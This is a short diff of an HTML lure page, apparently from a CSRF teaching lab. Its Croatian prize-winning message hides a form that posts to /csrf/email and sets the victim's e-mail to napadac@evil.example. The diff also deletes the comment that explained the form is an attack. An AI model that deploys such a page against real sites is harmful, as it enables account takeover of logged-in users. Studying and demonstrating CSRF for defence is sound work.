@@ -8,7 +8,6 @@
   <h1>Čestitamo, osvojili ste nagradu!</h1>
   <p>Pričekajte trenutak, preuzimamo vašu nagradu...</p>
 
-  <!-- Skrivena forma: salje zahtjev za promjenu e-maila u ime prijavljenog korisnika, BEZ CSRF tokena. -->
   <form id="napad" method="post" action="/csrf/email">
     <input type="hidden" name="email" value="napadac@evil.example">
     <button type="submit">Preuzmi nagradu</button>
